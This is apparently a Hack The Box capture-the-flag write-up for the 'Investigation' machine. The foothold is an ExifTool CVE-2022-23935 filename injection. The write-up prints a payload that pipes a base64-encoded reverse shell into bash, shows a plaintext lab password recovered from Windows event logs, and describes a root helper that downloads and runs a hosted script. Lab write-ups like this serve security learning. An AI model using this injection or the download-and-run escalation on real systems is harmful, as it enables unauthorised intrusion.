---
layout: post
title: "HTB: Investigation"
subtitle: "ExifTool command injection (CVE-2022-23935), a Windows event-log DFIR pivot, then a root download-and-run binary"
date: 2023-04-12
tags: [htb, linux, exiftool, cve, dfir, evtx, privesc]
category: writeups
kind: machine
tldr: "eForenzics runs user images through ExifTool 12.37, vulnerable to CVE-2022-23935 argument injection for RCE as www-data. User comes from a forensic detour: a leaked .msg holds a security.evtx whose Windows logon events carry smorton's password. Root is a SUID-like helper that downloads a script over HTTP and runs it as root when given the right magic argument."
---

## foothold: ExifTool CVE-2022-23935

`/service.html` takes an uploaded image and returns an ExifTool report. The banner gives it away:

```
ExifTool Version Number : 12.37
```

12.37 is vulnerable to CVE-2022-23935, argument injection through a crafted filename. The filename field becomes ExifTool args, so a filename that pipes a base64 reverse shell lands code execution as www-data:

```
filename="echo 'YmFzaCAtaSA+Ji4uLg==' | base64 -d | bash |"
```

## user: event-log forensics

A group-writable path hints at the real story, and mail on the box leads to a `.msg` with a `security.evtx` attachment. View the `.msg` (encryptomatic viewer), extract the evtx, and dump it with `evtx_dump.py`.

The interesting logon event is the one that is not WORKGROUP or the domain:

```
grep -P '(?=.*SubjectDomainName)(?!.*WORKGROUP)(?!.*EFORENZICS)' dump   # -> smorton
grep -P '(?=.*TargetUserName)(?!.*LJenkins)(?!.*EFORENZICS-DI)' dump    # -> the password
```

```
user: smorton
pass: Def@ultf0r3nz!csPa$$
```

## root

A root-owned helper takes a URL, a port, and a fixed magic string (`lDnxUysaQn`). It downloads the file at that URL into a buffer and runs it through Perl as root. Host a payload, call the binary with the magic argument, and it executes your script with root privileges.
